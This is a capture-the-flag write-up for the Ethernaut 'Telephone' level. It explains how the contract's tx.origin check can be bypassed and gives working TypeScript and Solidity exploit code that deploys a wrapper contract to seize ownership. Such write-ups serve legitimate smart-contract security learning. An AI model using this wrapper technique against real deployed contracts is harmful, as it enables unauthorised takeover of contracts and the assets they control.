# Solution for Ethernaut Level 04: Telephone

## Goal

The goal of this level is to claim ownership of the `Telephone` contract.

## Vulnerability Analysis

The vulnerability is in the `changeOwner` function of the `Telephone.sol` contract.

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

The function prevents the owner from being changed if the transaction originates from the same address that is calling the function (`tx.origin == msg.sender`). `tx.origin` is the Externally Owned Account (EOA) that initiated the transaction, while `msg.sender` is the immediate caller.

This check can be bypassed by using an intermediary contract to call the `changeOwner` function. If a player uses a separate contract (a "wrapper") to make the call, then for the `Telephone` contract:
- `tx.origin` will be the player's address.
- `msg.sender` will be the wrapper contract's address.

Since `tx.origin` and `msg.sender` are different, the condition `tx.origin != msg.sender` becomes true, and ownership can be claimed.

## The Exploit

The `exploit.ts` script automates this process by deploying and using a wrapper contract.

### Step 1: Deploy the Wrapper Contract

First, the script deploys an instance of `TelephoneWrapper`. This contract is designed specifically to call the `changeOwner` function on the `Telephone` contract instance. The `exploit.ts` script handles this deployment.

```typescript
const TelephoneWrapper = new TelephoneWrapper__factory(player);
const telephoneWrapper = await TelephoneWrapper.deploy(telephoneAddress);

await telephoneWrapper.waitForDeployment();
```

The `TelephoneWrapper.sol` contract simply contains a function that forwards the call, which is crucial for the exploit.

```solidity
contract TelephoneWrapper {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
```

### Step 2: Call `changeOwner` via the Wrapper

Next, the script calls the `changeOwner` function on our newly deployed `telephoneWrapper` instance.

```typescript
console.log("Call changeOwner function");
await (await telephoneWrapper.changeOwner()).wait();
console.log("New owner:", await telephone.owner());
```

This triggers the following sequence:
1.  The player's account calls `telephoneWrapper.changeOwner()`.
2.  The `telephoneWrapper` contract then calls `telephone.changeOwner(player_address)`.
3.  Inside the `Telephone` contract, `msg.sender` is the `telephoneWrapper`'s address and `tx.origin` is the player's address.
4.  The check `tx.origin != msg.sender` passes, and the owner of the `Telephone` contract is set to the player's address.

After this step, the exploit is successful, and the player has claimed ownership of the contract.